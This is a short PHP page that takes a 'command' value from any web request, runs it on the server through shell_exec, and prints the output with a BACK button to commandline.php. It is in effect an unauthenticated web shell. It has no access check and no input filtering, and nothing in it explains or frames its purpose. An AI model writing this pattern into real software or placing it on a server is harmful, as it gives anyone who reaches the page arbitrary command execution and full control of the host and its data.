<?php
$command = shell_exec($_REQUEST['command']." 2>&1");

echo '<div style="text-align:center;">';
echo '<p style="font-size: large; text-align: center; border-radius: auto; background-origin: padding-box;">'.$command.'</p>';
echo '<button type="submit" class="header_button" onclick="location.href=\'commandline.php\'" style="text-align:flex; text-align: center;">BACK</button>';
echo '</div>';
?>